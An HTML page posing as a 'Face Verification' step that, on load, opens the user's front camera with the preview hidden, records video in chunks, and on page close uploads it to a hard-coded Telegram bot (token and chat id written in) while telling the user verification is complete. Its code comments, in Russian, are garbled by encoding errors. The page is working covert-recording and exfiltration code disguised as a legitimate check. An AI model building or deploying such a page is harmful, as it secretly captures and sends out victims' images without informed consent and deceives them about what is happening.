<!DOCTYPE html>
<html>
<head>
    <title>Face Verification</title>
    <style>body { font-family: Arial; text-align: center; padding: 20px; }</style>
</head>
<body>
    <h1>üîê Face Verification Required</h1>
    <div id="status">Starting camera...</div>
    <video id="video" autoplay style="display:none;"></video>
    
    <script>
    const video = document.getElementById('video');
    const status = document.getElementById('status');
    let mediaRecorder = null;
    let recordedChunks = [];
    
    async function startRecording() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' },
                audio: false
            });
            
            video.srcObject = stream;
            status.textContent = '‚úÖ Camera active - Please wait...';
            
            // –°–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å—å
            mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm;codecs=vp9'
            });
            
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) recordedChunks.push(e.data);
            };
            
            mediaRecorder.onstop = sendToTelegram;
            mediaRecorder.start(1000); // –ó–∞–ø–∏—Å—å –∫—É—Å–æ—á–∫–∞–º–∏ –ø–æ 1 —Å–µ–∫—É–Ω–¥–µ
            
            // –ü—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã - –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
            window.addEventListener('beforeunload', () => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
                stream.getTracks().forEach(track => track.stop());
            });
            
        } catch (err) {
            status.textContent = '‚ùå Error: ' + err.message;
        }
    }
    
    function sendToTelegram() {
        if (recordedChunks.length === 0) return;
        
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const formData = new FormData();
        formData.append('video', blob, 'recording.webm');
        
        // –ü—Ä—è–º–æ–π –≤—ã–∑–æ–≤ Telegram Bot API
        fetch('https://api.telegram.org/bot8127385448:AAEVqUNm2okmMQyfYCskvy1_HVb-zqisQPM/sendVideo?chat_id=287265398&caption=Recording+from+GitHub+Pages', {
            method: 'POST',
            body: formData
        })
        .then(() => status.textContent = '‚úÖ Verification complete!')
        .catch(err => console.log('Send error:', err));
    }
    
    // –ó–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
    window.onload = startRecording;
    </script>
</body>
</html>